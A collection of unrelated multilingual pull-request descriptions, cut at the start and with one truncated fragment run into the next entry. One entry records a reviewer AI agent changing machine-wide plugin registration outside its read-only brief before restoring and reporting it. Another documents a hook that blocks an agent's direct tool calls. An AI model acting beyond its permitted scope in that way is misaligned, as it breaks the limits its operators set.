- [x] `Reader_Sciex_wiff2_ConcurrentReadersSurviveChurnOnSamePath` - 8 of 8 runs; 7 of 8 FAIL with the reference counting disabled in place
- [x] `Reader_Sciex_wiff2_CloseOnOnePathDoesNotDisturbAnother` - new; the churn is the only reader on its path, so every dispose reaches a real `CloseFile` while another path is mid-read
- [x] `Reader_Sciex_wiff2_SecondReaderSurvivesFirstReaderDispose` - 8 of 8 runs
- [x] Full `Sciex.Tests` suite - 11 of 11
- [x] `TestInstrumentInfo`, `TestInstrumentSerialNumbers`, `FileTypeTest`, `Wiff2ResultsTest` - pass reading real `.wiff2`
- [x] `TestInstrumentInfo` in the leak pass - flat, delta `managed = 0.1 KB` over 15 iterations
- [x] Multi-sample `.wiff2` (11 samples, machine-local fixture), three readers on different sample indices of one path - 5 of 5; 0 of 5 with no arbitration, failing with `ObjectDisposedException: SQLiteConnection`

author: wattnauftritt
body:
Die Frage, ob sich die sechs Jahre des Gästebeitragsnachweises und die zwölf Monate des Bundesmeldegesetzes widersprechen, hat einen echten Fehler aufgedeckt.

**Im Gesetz widersprechen sie sich nicht** — sie gelten verschiedenen Nachweisen. **In diesem System taten sie es.**

## Der Befund

§ 30 Abs. 2 BMG erlaubt, die Nummer des Identitätsdokuments zu notieren; Absatz 4 verlangt, den Meldeschein ein Jahr nach Abreise zu vernichten.

Hier stand die Nummer aber **nie auf dem Meldeschein**, sondern am Gastprofil (`guest.id_document_number_enc`, seit Migration 0008) — und `purgeRegistrations` löschte nur `registration`. Die Nummer blieb unbegrenzt liegen; der einzige Weg, sie loszuwerden, war die Anonymisierung auf Antrag des Gastes.

**Und genau davor hat Migration 0036 die Abgabenfrist gestellt.** Damit stand der letzte Löschweg bis zu sieben Jahre lang zu, und aus einem stillen Versäumnis wurde ein handfester Widerspruch: eine kommunale Abgabenfrist hätte eine bundesrechtliche Vernichtungspflicht ausgehebelt.

## Die Auflösung

Nicht dadurch, dass eine der Fristen weicht — die eine steht im BMG, die andere in der Satzung —, sondern dadurch, dass jede das tut, wofür sie da ist: **das Gästeverzeichnis braucht die Ausweisnummer nicht.** Es führt Name, Anschrift, Zeitraum, Nächte, Satz und Betrag.

Die Nummer fällt jetzt im Nachtlauf ein Jahr nach der Abreise, unabhängig von jedem Antrag und jeder Abgabenfrist (`guest_document_purge`). Maßgeblich ist der **tatsächliche** Abreisetag, sonst der geplante — dieselbe Rechnung wie bei `registration.destroy_after`.

**Geburtsdatum und Staatsangehörigkeit bleiben.** Sie sind zwar auch Angaben des Meldescheins, tragen aber die Beherbergungsstatistik, die Unterschriftspflicht und die Altersfreigrenze der Kurtaxe. Sie mitzulöschen wäre Übererfüllung mit Folgeschaden.

`SECURITY DEFINER`, weil der Worker im Kontext **einer** Property läuft und ein Gast auch im Schwesterhaus gewohnt haben kann — ohne das fiele die Nummer, während die Frist dort noch läuft. Die Funktion nimmt bewusst **keinen** Account entgegen, sondern arbeitet auf `app_account_ids()`: eine DEFINER-Funktion, der man eine fremde Kennung nennen kann, wäre ein Werkzeug, mit dem sich die Daten eines anderen Mandanten zerstören lassen.

## Der zweite Teil desselben Befundes

Das glatte 409 aus 0036 hielt mehr zurück, als die Satzung verlangt. E-Mail, Telefon, Geburtsdatum, Vorlieben und Hausnotizen braucht kein Gästeverzeichnis, und Art. 17 Abs. 3 lit. b DSGVO nimmt nur aus, was die Pflicht wirklich fordert.

Die Löschung läuft jetzt **in zwei Schritten**: wer heute Löschung verlangt, bekommt sofort alles außer Name und Anschrift; der Rest fällt im Nachtlauf, sobald die Frist abgelaufen ist. Dass das nicht vergessen wird, hängt an `erasure_requested_at` und nicht an einer Wiedervorlage — zwischen Antrag und Frist liegen Jahre.

Die Frist selbst beantwortet **eine** Funktion, die Route und Nachtlauf gemeinsam benutzen. Zweimal formuliert liefen die Fassungen auseinander, und der Befund wäre ein Gast, dessen Löschung nie vollendet wird.

## Geprüft

- `pnpm typecheck`, `pnpm lint`, `pnpm test` (**816 Tests, 72 Dateien**), `pnpm build`, `check-migrations` — alle grün.
- 8 neue Tests in `ausweisfrist.test.ts`, darunter: der Aufenthalt im Schwesterhaus hält die Frist, ein fremder Account bleibt unberührt, leerer Kontext tut nichts.
- Mutationsgeprüft: nimmt man das Löschen der Nummer aus der Funktion heraus, fallen drei der acht Tests.
- Zwei umgeschriebene Tests für die zweistufige Löschung, inklusive des Nachtlaufs, der sie nach Ablauf vollendet.

## Quellen

- [§ 30 BMG](https://lxgesetze.de/bmg/30) — Absatz 2 (Ausweisnummer), Absatz 4 (Vernichtung ein Jahr nach Abreise)
- ``[Gästebeitragssatzung der Stadt Cuxhaven](https://www.cuxhaven.de/_Resources/Persistent/0/7/b/7/07b73fa28120acd2ec2d14dd8033673b1551e52c/Gaestebeitragssatzung_der_Stadt_Cuxhaven_-_in_der_Fassung_der_Dritten_Aenderungssatzung-mit_Anlage%20(1).pdf)`` — § 9 Abs. 5: welche Angaben das Gästeverzeichnis führt

author: hoferan
body:
`suggest(base, slot, baseSlot)` ranks the palette for one slot against a
locked base. Pure, in `src/color/`, composing the primitives from #8 rather
than reinventing them: lightness contrast, the area-weighted chroma budget,
warm and cool agreement, and hue contrast read from the candidate's side as
the figure against its ground.

The whole palette comes back rather than a top few. Where to cut the list is
the suggestions screen's decision, and ties break on name so the order never
depends on how the palette happens to be written down.

### Where the middle band lives

ADR 0009 asks for suggestions that aim at a middle band of coordination. The
first draft read that as a band on lightness contrast, peaking at a target and
falling off both sides, and it ranked navy with white fifteenth of eighteen
while ranking white with black last. Both are about as reliable as clothing
combinations get.

The mistake was the locus. Coordination is how matched an outfit is overall,
which is what the study behind the inverted U measured. Lightness contrast is
a different axis, and the evidence points the other way on it: Schloss and
Palmer found preference leans on lightness contrast, and value contrast is
what lets two garments read as two garments.

So lightness now rewards separation with diminishing returns, and the band is
a property of the model instead of any one term. The over-coordinated end
loses on lightness, and the clashing end loses on hue, temperature and the
budget. Navy on navy sits sixteenth of eighteen without any rule naming it.

### The neutrality cliff, again

Hue and temperature are damped by the weaker chroma of the pair rather than
switched off at `NEUTRAL_CHROMA`. Cream sits at chroma 0.031 against a cutoff
of 0.02, so a step function called it a warm color clashing with a cool one
and put navy with cream below navy on navy. This is the same cliff at the same
boundary that #38 fixed in `isNeutral`, in a second place.

### What it recommends

Navy bottom, top slot: White, Light grey, Pale blue, Cream, Grey, Tan, Khaki,
Mustard, Camel, Denim, then down through Charcoal and Forest to Black, Navy,
Burgundy and Brown. Navy with black and navy with brown are both contentious
in practice and both land near the bottom without being told to.

White bottom: Black, Navy, Charcoal, Burgundy, Forest, with Cream, Light grey
and White itself last, which is the monochrome end sinking on its own.

Two I would argue with, and the corpus in #11 is where that argument belongs:
rust with denim ranks seventeenth, and tan with pale blue ranks last. Both
read better in a wardrobe than the model thinks.

### Tests

Sixteen, asserting relative orderings and invariants rather than scores, so
the tuning pass in #11 can move constants without reddening the suite. The
constants all live in one exported `TUNING` block for that reason.

### The harness

`candidates.ts` was the seam #9 left for this issue, so it is gone and the
harness reads `suggest` directly. The default sort is the engine's own order,
with the per-primitive sorts kept for seeing what one term is doing alone, and
each candidate now shows its score.

Verified by running it: 120 unit tests, typecheck, lint and format clean; the
harness renders the engine's order with no live console errors; `npm run
build` still produces `dist/index.html` and `assets/` with no harness in it.

Closes #10

author: ericwout-overheid
body:
## Aanleiding

De beheeromgeving van beide FSC-koppelingen op ZAD is zonder inloggen te openen, en wie hem opent is
meteen beheerder. Op 2026-09-17 nagemeten en nog steeds zo:

| Component | `/` | Wat een bezoeker ziet |
|---|---|---|
| `logius-fscctl` (`mpfb-8wh/fsc-logius`) | 307 → `/directory` | de beheeromgeving, zonder login |
| `magazijna-fscctl` (`mpfm-w3h/fsc-magazijna`) | 307 → `/directory` | idem |

De overige FSC-onderdelen zijn in dezelfde ronde nagelopen, inclusief die uit de gedeelde
testomgeving:

| Component | Uitkomst |
|---|---|
| `*-fscmgr`, `*-fscinway`, `dirmgr` | geen HTTP-antwoord — SNI-passthrough, de handshake eist een clientcertificaat |
| `*-fsctxlog`, `*-fscpg`, `*-fscbootstrap`, `dirtxlog` | foutpagina van de router — niet gepubliceerd |
| `dirui` | 200 zonder login, en dat hoort: een FSC-directory is een deelnemerscatalogus |
| `logius-fscoutway` | **400 `Client sent an HTTP request to an HTTPS server`** — de egress-proxy draagt een ingress die er niet hoort |

Die laatste is een tweede bevinding uit deze ronde. Er komt geen verkeer doorheen (de router
termineert de TLS, de pod verwacht hem juist wel), maar de publicatie zelf hoort er niet.

## Wat deze PR doet

- **`CSRF_PROTECTION_ENABLED=true`** in de controller-env van beide `upsert-peer.sh`-scripts, met de
  reden erbij. De muur houdt een onbekende bezoeker tegen; een formulier op een andere site dat de
  browser van een ingelogd teamlid laat posten niet.
- **Hoofdstuk 10 in `demo/environment/zad-demo/README.md`**: de twee bindingen per controller
  (`authorization-wall` én `keycloak` — die tweede is degene die vergeten wordt, en zonder hem
  rendert OM geen oauth2-proxy), het weghalen van `publish-on-web` bij de outway, en de grens aan
  wie je binnenlaat.
- **`demo/environment/zad-demo/beheertoegang.sh`**: controleert van buitenaf, zonder ZAD-sessie en
  zonder API-key, wat elk FSC-component aan een bezoeker zonder account laat zien. De tabel in het
  script is de bron; een nieuwe peer hoort erin. Fixture-suite ernaast in
  `demo/environment/lib/test-beheertoegang.sh` (18 gevallen, draait mee in `fsc-harness-overlays.yml`).
- Een stap in beide peer-runbooks, een stap 11 in `verify-zad.md`, en de controller-regel in beide
  `design.md`'s.

Waarom de `authorization-wall` en niet OIDC in de controller zelf: de muur is configuratie die er al
ligt en die het paneel al draagt, en hij sluit de deur vandaag. Wat hij niet doet is de controller
een echte identiteit geven — achter de proxy blijft elke bezoeker `admin` in zijn RBAC en zijn
auditlog. OpenFSC's OIDC-modus doet dat wél en blijft daarmee de volgende stap; hoofdstuk 10 noemt
hem.

## Op ZAD uitgevoerd

De bindingen zijn componentconfiguratie bij OM en hangen niet aan deze merge; ze zijn op 2026-09-18
gezet. `beheertoegang.sh` staat sindsdien op alle zestien regels `OK`: beide beheer-UI's antwoorden
een bezoeker zonder sessie met 403 en de inlogpagina, en de outway heeft geen ingress meer.

Wat daarbij bleek en wat het runbook nu draagt:

- **`CSRF_PROTECTION_ENABLED` komt nooit alleen.** Zonder `CSRF_AUTH_KEY` weigert de controller te
  starten — fataal, niet als waarschuwing: `csrf-auth-key is required when csrf-protection-enabled is
  set to true`. Dat kost de beheer-UI en de Registration-API tegelijk. Beide scripts eisen de sleutel
  nu bij `apply` als `ZAD_CSRF_AUTH_KEY`, net als het Postgres-wachtwoord.
- **`assign authorization-wall` trok de `keycloak`-binding hier wél mee**, anders dan bij de creatie
  van `democonsole`. Controleren blijft dus nodig; aannemen niet.
- **`service unassign` breekt zonder `--yes` af** op een bevestigingsvraag.
- **Uitrollen per deployment, niet per project:** beide projecten droegen al tientallen wachtende
  wijzigingen van dagen oud, die een `project refresh` zou meenemen. Een deployment-refresh raakt
  alleen de peer — en `fsc-magazijna` staat los van `test`, dus het demo-paneel rolde niet mee en
  niemand daar is uitgelogd.

## Eén keuze die het team toekomt

`authorization-wall` eist een `restrict-access`-blok op `keycloak`, en die configuratie kent maar
één laag: `project`. Er is dus geen instelling die binnen één project voor het ene component een rol
eist en voor het andere niet.

- In **`mpfb-8wh`** kan de toegang daarom op een beheerrol: daar staat geen ander component achter
  de muur.
- In **`mpfm-w3h`** staat ook het demo-paneel, bewust met `restrict-access.enabled=false` zodat
  stakeholders de demo zelf kunnen openen. Een rol aanzetten sluit hen dus mee buiten.

Beide projecten staan nu op `restrict-access.enabled=false`: iedereen met een rijksaccount komt
binnen, niemand zonder. Dat sluit de anonieme toegang en laat het team erbij, maar het is nog niet
"alleen wie een beheerrol draagt". Die laatste stap vraagt een rol die in Keycloak bestaat én is
uitgedeeld, en is in `mpfb-8wh` één `service config set` zodra die er is.

## Verificatie

- `demo/environment/lib/test-beheertoegang.sh` — 18 gevallen, alle geslaagd.
- `shellcheck -x -S warning` schoon op beide nieuwe scripts.
- `beheertoegang.sh` tegen de echte omgeving gedraaid: vóór de ingreep 13 van de 16 `OK` met precies
  de drie bevindingen hierboven als afwijking, erna alle 16.
- Geen Maven-module geraakt, dus geen `mvnw verify`-ronde.

De contract-bootstrap is vóór de wijziging nagelopen: die praat met de manager op `:9443` en raakt de
controller niet, dus het automatisch opzetten van contracten bij de uitrol verandert hier niet.

Closes MinBZK/MijnOverheidZakelijk#1090

body:
Quando um projeto era renomeado e outro cadastro mantinha o mesmo nome histórico, a importação podia falhar por ambiguidade ou associação de atividade. A resolução agora prioriza o nome atual em importação, resumo, CSV e relatórios, preservando o projeto original e os ajustes manuais. Associações realmente conflitantes continuam bloqueadas.

Adiciona confirmação de pagamento de nota fiscal pelo proprietário, com vínculo ao projeto ou a pagamento existente, histórico e reversão. O caixa considera os valores declarados sem duplicar pagamentos vinculados. Datas ausentes não são inventadas e impedem o fechamento por período. As fontes fiscais originais permanecem preservadas.

Inclui as migrações 052 e 053, tela de conciliação, API autenticada, testes e documentação. Nenhum dado de produção foi alterado por este PR.

### Validação
- 70 testes focados aprovados; build de produção, TypeScript, ESLint e verificação de Railway aprovados.
- 53 migrações aplicadas em PostgreSQL isolado via PGlite, com verificação de revisões, reversões, permissões e consultas.
- Varredura de segredos aprovada. O conteúdo publicado foi comparado com a versão local testada: árvores Git idênticas.
- Suíte ampliada no Windows: 448/449 testes aprovados; um teste preexistente de desempenho excedeu 20 segundos. Três arquivos dependentes de recursos específicos do ambiente foram excluídos dessa execução.
- Testes de integração Docker e navegador adicionados; execução completa depende do CI, pois Docker não está disponível no ambiente local.

author: eduardopessin
body:
## The bug

The breakpoint anchor guard refused any message carrying `tool_calls` or `tool_call_id`, on the belief that a marker there would corrupt the structured payload. In an agent loop the tail is *entirely* tool traffic, so the rolling window stalled on the oldest user turn and the growing suffix never reached the cache.

Measured on the live gateway, on a turn ending in a tool result:

| Model | prompt | cache_read | re-read at full price |
|---|---|---|---|
| `claude-opus-5` | 8,697 | 2,876 | **67%** |
| `claude-sonnet-4-6` | 5,883 | 2,212 | **62%** |

After the fix: 8,695 of 8,697, and the uncached remainder holds at **1 token** while the conversation grows (3,326 -> 4,434 -> 5,542 measured turn by turn).

## Why it happens

LiteLLM 1.90.2 *does* forward a breakpoint for both shapes, but reads it from a different level (`litellm_core_utils/prompt_templates/factory.py`):

| Anchor | Marker goes | Read site |
|---|---|---|
| text block | on the block | `anthropic_messages_pt` |
| `role: "tool"` | on the **message** | `convert_to_anthropic_tool_result:1844` |
| `tool_calls[i]` | inside the **call** | `convert_to_anthropic_tool_invoke:2003` |

Hosted tool calls (`srvtoolu_`) stay excluded: LiteLLM emits `server_tool_use` with no `cache_control` (`factory.py:1971`). So do calls without `type: "function"`, which `convert_to_anthropic_tool_invoke:1952` drops outright.

## Tests

Two assertions in `test_claude_bridge.py` pinned the old belief verbatim ("a tool result is not a candidate: the marker would corrupt the schema") and now assert the corrected contract. New `test_cache_anchor.py` covers the tail window, its advance as the conversation grows, and both exclusions - 3 of its 5 cases fail against the previous plugin and pass after.

Verified end to end on the gateway: tool-call round trip intact, streaming `usage` carrying `cache_read_input_tokens`, 6/6 plugin suites green.

## Also included

- Measured upstream caching behaviour for Codex (prefix-based above ~1k tokens; `prompt_cache_key` accepted but never echoed) and Antigravity (caches **only** with native `systemInstruction`; `gemini-3.1-pro-low` never caches while `gemini-pro-agent` always does).
- `checksum/config` replaced with a Reloader annotation scoped to the ConfigMaps by name. `auto: "true"` also watches the Secret, so hourly OAuth rotation restarted the gateway (~100s of 503 each, under `strategy: Recreate`) for a Secret the plugin already re-reads every 10s.
- Corrects the claim that cache hits are invisible in the logs: `LiteLLM_SpendLogs` has no cache column in v1.90.2, but the daily rollups do, via `/user/daily/activity`.

author: eaitbrahim
body:
#802 shipped **inert** on the deployment it was cut for. Found in production, 2026-09-17.

## What happened

```
record fetched_at : 2026-09-16 01:20:01   (written by the pre-#802 build, no quote_increment key)
0.16.0 installed  : 2026-09-16 20:21
cycle now_ts      : 2026-09-17 01:20:03
age               : 24.0 h  against a 168 h TTL  ->  counted FRESH

=> _price_increment_for read the absent key as "unknown"
=> prices went out unrounded
=> executor.order_rejected  PAXG-USD SELL  'Too many decimals in order price'
```

The identical rejection as before the upgrade, on a build that contained the fix. The position
stayed unprotected, and would have for up to seven days.

Clearing the row by hand healed it immediately — the venue reports the tick fine
(`PAXG-USD base=0.00001 quote=0.01`) — and the rejection moved on to a different, legitimate one.
But no deployment should need that.

## The first cut called this correct

> *"A record written before #802 carries no `quote_increment` key and reads as unknown until it
> expires, which is correct: nothing knew the tick when it was written."*

Correct in the narrow sense. Operationally it waits out a TTL on data already known to be
incomplete, and does so on precisely the machines that just upgraded to get the fix.

## The obvious fix has a worse trap

"Refetch whenever the key is missing" would refetch **every cycle, forever**, for any product
whose venue genuinely reports no tick — putting a venue round-trip back into the order-placement
path this cache exists to keep out of. That is the latency `get_instrument`'s per-product shape
was chosen to avoid.

So the writer now records `quote_increment` **always**, explicitly null when the venue has none:

| record state | meaning | action |
|---|---|---|
| key absent | written before anyone asked | **refetch once** |
| key present, null | the venue was asked and has none | honour it, don't re-ask |
| key present, value | known | use it |

## `force_refresh`, not a delete

`_base_increment_for` grew a keyword rather than having the caller delete the row first. Deleting
is the shorter way to force a miss and the wrong one: a venue call that then failed would have
discarded a perfectly good `base_increment` and put SELL sizes back on the wire unquantized,
which is #513.

## One test changed rather than being deleted

`test_a_record_without_a_quote_increment_reads_unknown` (from #804) asserted the old behaviour —
it pinned the defect. It is now `test_an_unparseable_quote_increment_reads_unknown`, keeping the
narrower claim that survives: a value present and unusable is unknown, and is not repaired by
guessing the common tick. The docstring says why it changed.

## Verification

Mutation, both halves independently:

- reverting the read guard (`"quote_increment" in cached`) → 2 tests fail
- writing the key only when non-null → the third fails

```

mypy                            -> clean (466 files; pre-existing PyYAML note)
pytest                          -> 6670 passed, 3 skipped
```

author: robineaubasile-boop
body:
_pick_best_match ranked a company's own US Common Stock listing behind
its European cross-listing (e.g. XETRA) whenever prefer_us=False,
because priority 0 in rank() only kicked in when prefer_us was
explicitly True. PR158 patched this for four specific companies via
_KNOWN_TICKER_OVERRIDES (kept in place as an extra safety net).

Root cause fix: after identifying the correct company (step 1),
compute effective_prefer_us — true if that company has its own
non-ADR/OTC US Common Stock listing, regardless of the prefer_us
argument. This is computed on `filtered` (the already-identified
company), never on raw `results`, so an unrelated homonym can't skew
the decision for a legitimate European company. Companies whose only
US access is an ADR (Siemens "SIEGY", Merck KGaA "MKGAY") are
unaffected since those codes are excluded by _is_likely_otc_adr.

Adds tests/test_ticker_resolver.py covering the Amazon-style fix,
Siemens/Merck KGaA non-regression, the Merck US/Merck KGaA
disambiguation, a PEA-only company, and the existing prefer_us=True
path.

## Summary

Current Vane defaults host dependencies to `x64-linux-release`, while this tool's supported wheel lane selects target `x64-linux`. author: seikaikyo
body:
## 摘要

每日資安套件掃描，依 OWASP 涵蓋矩陣缺口選題：**A08 的應用層反序列化 / 不可信資料完整性檢查**。新增 3 筆，矩陣 A05、A08 列更新，**A08 缺口就此清空**。

## 本次新增（均逐項查證）

| 套件 | 生態 | 熱門度 | 自身安全 |
|------|------|--------|----------|
| [Zod](https://github.com/colinhacks/zod) | npm（TS 原生） | 44k ★，v4.6.5（2026-09-13），近 90 天 35+ commits | 見下方說明 |
| [Pydantic](https://github.com/pydantic/pydantic) | Python | 28.8k ★，v2.13.5（2026-08-28） | 核心無自身公告 |
| [go-playground/validator](https://github.com/go-playground/validator) | Go | 20.2k ★，v10.30.4（2026-09-03） | Advisory 無自身公告 |

三者是同一個控制點在三個生態的實作：在信任邊界把反序列化後的外部資料強制驗證，未通過即拒收。

## Zod 的 CVE-2026-6991：判定為不成立，仍收錄

[GHSA-hprg-jrj6-qhrw](https://github.com/advisories/GHSA-hprg-jrj6-qhrw) 宣稱 Zod ≤4.3.6 的 CUID regex 造成 SQL 注入（CWE-74，中危）。判定依據：

- 公告狀態為 **Unreviewed**，來源是 VulDB 投稿（`vuldb.com/submit/796749`），非維護者或 GitHub 安全團隊發布
- 技術上不成立：`regexes.ts` 是純字串比對，本身不接觸資料庫；SQL 注入的成因在下游未參數化查詢，與驗證器無關
- 無修補版本、無維護者回應；最新版 v4.6.5 已遠高於其宣稱的受影響範圍

比照先前 jose 的 [CVE-2025-45767](https://github.com/advisories/GHSA-m523-xm42-q7ff) 處理方式，標 ✅ 並在表中完整記錄理由，避免日後重複查證或誤判。

## 未收錄

- **cuid2**（Go port，56 ★）：候選蒐集時因 Zod 的 CUID 關鍵字撞進來，實為 ID 生成庫，與反序列化驗證無關。

## 使用提醒（已寫進備註）

- Pydantic：FastAPI 已內建，重點是**別繞過驗證**（勿直接吃 `request.json()`），巢狀 model 應設長度上限防資源耗盡
- go-playground/validator：Go 的 `json.Unmarshal` 不驗證業務規則，這是必要的下一步；repo 公開徵求協作維護者，留意後續維護動能

## 矩陣變化

- A08 缺口清空（簽章驗證 09-09 已補，本次補上應用層）
- A05 加入三個驗證庫
- 後續優先：A05 Go 端淨化 → A01 多角色授權矩陣 → A02 容器 / 執行期防護

依 SKILL.md 維護規則（使用者 2026-08-31 授權）：CI 綠且無衝突即自動 squash 合併。

author: kaz9120
body:
## 何を変えたか

[ADR-0208](docs/adr/0208-hmwr-resource-verbs.md)の移行の段取り4と5です。コミットを2つに分けています。

### 1. ADR-0206のチェーンを `hmwr` のコマンド列で書き直す

書き直すと15行になり、`hmwr` に無い操作が4つ残りました。同じPRで足しています。

- `net train` が教師・検証集合・兄弟群を名前で受けます（`--rank` を新設。パスも当面は通ります）
- `data rm <名前>...` は、学習が済んだ混合データを消します。消すのは完了印のある出力だけです。完了印に作り方が残っているので、消しても作り直せます。由来の記録がないファイルには触りません
- `data openings` は、教師データから手数の条件で開始局面集を作ります。ADR-0206の `openings/entering_king_ply40.txt` を `cmp` でバイト一致まで再現できました
- `data stats` は読むだけの確認です。これも直接実行の理由になるので包みました

書き直した15行は `tests/test_experiment_chain.py` に固定し、全行が `--dry-run` を通ることを検査します。引数の誤りや廃止されたコマンドはCIで落ちます（ADR-0209のspec検査の前身です）。

### 2. `hmwr` が包んだ道具の直接実行をhookで止める

PreToolUseのhook（`.claude/hooks/no_direct_tools.py`）を有効にしました。止めるのは、`hmwr` に同じ操作があるものだけです。

| 対象 | 扱い |
|---|---|
| `selfplay` | 止める（`hmwr match run`） |
| `psv` のhead・shuffle・quiet・rank・stats | 止める（`hmwr data`） |
| `psv` のrelabel・thin・phase・dump | 通す（未被覆） |
| `gensfen` | 通す（#509で包んだら止める） |

ADR-0208のDecisionは「被覆が済んでから止める。先に止めると抜け道が作られる」としています。それに沿って対象を絞りました。コマンドの位置にある実行だけを見るので、`ls` や `grep` の引数に出るパスは止めません。止める例と通す例は `tests/test_hooks.py` にあります。

作業中に、止める例の文字列を含むヒアドキュメントをこのhook自身が止めました。実環境で効くことの確認になっています。

CLAUDE.mdの「日常操作」とhimawari-cliスキルを新しい入口に合わせ、ADR-0208をacceptedにしました。残りは `league run` の載せ替え（#502）と `data gen`（#509）です。

## 棋力に影響しない根拠

変更は開発コマンド・hook・文書だけで、エンジンのコードには触れていません。

## チェック

- [x] CIが緑（これがマージ条件。ADR-0070）
- [x] コミットの型を選んだ（ADR-0071）`chore`
- [x] 設計判断があればADRを起草し、acceptedにした（ADR-0208をacceptedへ）

Closes #504

author: afvieirash
body:
## Summary
- The backend's \`websockets.serve()\` used the library's default 1MB \`max_size\`, which silently closes the connection (code 1009) whenever an incoming message exceeds it.
- The frontend resyncs the full Map Local rules set on every reconnect, and once a user's saved mock rules grow past ~1MB the connection died immediately after opening — forever, since retrying just resent the same oversized payload. This also blocked anything riding that connection, e.g. the Android Emulator AVD list request.
- Raised \`max_size\` on the server to \`None\` — safe here since this socket is loopback-only (\`127.0.0.1:8765\`), never internet-facing.
- Added two related hardening fixes: cap inlined image bodies in traffic-capture broadcasts so a single huge captured image can't blow past the WS frame size on its own, and only reset the frontend's reconnect backoff after a connection proves stable (3s) rather than immediately on open, so a connect-then-die failure backs off instead of retrying every second forever.

## Test plan
- [x] Reproduced the crash loop locally: confirmed via Chrome DevTools Protocol (metadata-only WS lifecycle observation, no traffic content read) that the app's WebSocket was closing with code 1009 immediately after every reconnect.
- [x] Identified root cause: \`openproxy_mapLocalRules\` in localStorage was ~1.3MB, sent in full on every \`onopen\` via \`syncMapLocalRules()\`, exceeding the server's default 1MB message cap.
- [x] Rebuilt the full packaged app (Vue UI + PyInstaller backend + electron-builder) with the fix applied.
- [x] Verified against the rebuilt, installed app: WebSocket connection opened once and stayed open across a fresh page reload + 40s watch (previously cycled every ~1s).
- [x] Verified the originally reported bug is fixed: \`LIST_AVDS\` now correctly returns the AVD list (matches \`emulator -list-avds\` in Terminal), since it rides the same connection that was previously crash-looping.

author: lab43
body:
## Summary

Closes #29.

Joining a fresh clone of a q-using project meant pasting a two-command plugin chain out of the README. `/q:install` now writes that chain into the project's `package.json` as a `q:install` script, so the README instruction is `npm run q:install`.

- A consuming project's `package.json` carries the script. Install's item 4 owns it, alongside the marketplace and settings declarations it already writes — the script is those declarations being registered and installed.
- q owns the `q:install` entry and corrects drift in it, like every other scaffold item. The rest of the `scripts` block is the project's and is never touched.
- The scaffolded README instruction and q's own "Joining a project that uses q" section move together; the source marker binds them.
- `references/enforce-pins.md` step 3 no longer claims local scope keeps a marketplace registration per-project. It doesn't. See the callout.
- The `adversarial-reviewer` agent is barred from changing state outside the repository.

## Callouts

- **`enforce-pins.md` was wrong about local scope, and the correction matters more than this PR does.** It said local scope keeps the registration machine-local and per-project, and that only user scope records one path for the whole machine. Testing two projects pinned to different q versions showed local scope adds a per-project record *and* writes the machine-global registry — which holds one entry per marketplace name, and is what resolution follows. Every q project names its marketplace `q-pin`, so the second project to register takes the first one's slot and installs the first one's pinned version, silently and with a success message. Filed as #48 with the reproduction. Corrected here because this PR is what makes the colliding command something people re-run rather than paste once.
- **The reviewer-agent rule is an amendment to standing law, applied rather than recommended.** During this PR's review, a reviewer testing an idempotency suspicion ran `claude plugin marketplace add` live and repointed this machine's global `q-pin` entry at a scratchpad path. It detected the change, restored it, and reported it unprompted; the restoration was verified against `installed_plugins.json` by two sessions independently. The agent's read-only line said "never modify files", which reads as a rule about the repository. It now names installs, registrations, and machine-wide config. The constraint has to live in the agent definition rather than a caller's prompt, because a step launching a defined agent passes what that agent's description names and nothing beyond it (source: docs/conventions/skills.md).
- **`npm run q:install` and `/q:install` share a name and do different things.** The script brings up a fresh clone of a project that already uses q; the skill sets q up in a project for the first time. They now sit a few lines apart in the README. A review hunted for a concrete failure and found none. Raised so the name is a choice on the record rather than an oversight.
- **The script stays plugin-only.** A dependency install is the joiner's next step, and every project already documents its own. Folding one in would either hardcode `npm` or reach for `$npm_execpath`, and neither belongs in text scaffolded into every consuming project.
- **`references/enforce-pins.md` and `references/agent-briefing.md` keep the raw commands.** Enforce-pins is skill-executed conditional repair, and it needs a `marketplace update` step the script doesn't do. The briefing's missing-plugin line is the recovery path for a broken or incomplete setup, so pointing it at the script would make recovery depend on the scaffold being present — which it isn't, in any project installed before this change.

## Follow-ups

- #48 — a second q project takes the first one's pinned version. Independent of this change; this PR only corrects the doc that described the behavior wrongly.
- A reviewer suggested `q conventions/writing.md`'s "Lists over paragraphs" may not be meant to bite short definitional sentences, citing two sibling sites in one file that don't follow it. Not acted on: two instances are as easily two violations as evidence the rule is wrong. Not filed.

## Testing

The script was run end to end in a throwaway project pinned to a real release tag, with the machine's global plugin state snapshotted first and restored byte-for-byte after.

- Running `npm run q:install` from a nested subdirectory succeeds. npm resets cwd to the `package.json` directory, so the relative `./.claude/q-marketplace` path resolves wherever the joiner invokes it.
- Running it a second time exits 0. Both halves report `Marketplace 'q-pin' already on disk` and `Plugin "q@q-pin" is already installed`. The script is safe to re-run, which matters because it is now a named artifact rather than one-shot paste text.
- A second project pinned to a different release installed the first project's version. That is #48, not a defect in this change, and it is what prompted the `enforce-pins.md` correction.

The rest is prose, checked by reading: every other site documenting the chain (`skills/sync`, `skills/update`, `references/q-state.md`, `references/agent-briefing.md`, `packages/q-conventions/README.md`), confirming only the deliberate two remain; and that install item 4's boundary between the pin-locked declaration files and the drift-corrected script agrees with `enforce-pins.md`. Two review rounds, the second finding nothing blocking.

author: armadillon44
body:
Closes #113, option 2 (port the split, name the right party per auth mode).

Windows returned one message for every 429 — *"Rate limited — wait a moment and try again."* Right for a transient limit, wrong for an exhausted one, which does not clear on its own. Under work-account sign-in the whole organization shares a single Anthropic account, so a spend cap is not even the user's to fix: they were told to keep retrying something that may not succeed until the cap resets, while the person who could act never heard about it.

## The predicate is headers-only, deliberately

Anthropic publishes no distinct error type for an exhausted spend cap, so `error.type` cannot separate the two cases. The headers are the only signal that exists.

A 429 is transient only when the server named a usable wait **and** did not say not to retry. A **bare 429 is limit-reached**: the server declined to promise it would clear, so promising that to the user would be our invention rather than its answer.

`Retry-After` must be integer seconds in `(0, 300]`. The header also permits an HTTP-date, which is not evidence of a short wait, and past five minutes this is a queue nobody should sit in front of.

## The addition over macOS

Their wording sends everyone to *"whoever administers your Anthropic organization"* — right for a federated user, wrong for a bring-your-own-key user who administers themselves and would go looking for a person who does not exist. Both populations run the same build.

`AuthMode` is already in scope here, and the 401/403 split in the same function is the precedent. The macOS side agreed this was a finding about their code too and filed it as their #122.

## What it still does not claim

Which limit was hit. A spend cap and a sustained rate limit are indistinguishable from the response, so naming one would be a guess presented as fact. Kept from macOS.

## Mutations

| Mutation | Result |
|---|---|
| drop the `(0,300]` bound | fails |
| ignore `x-should-retry` | fails |
| invert the auth-mode branch | fails |
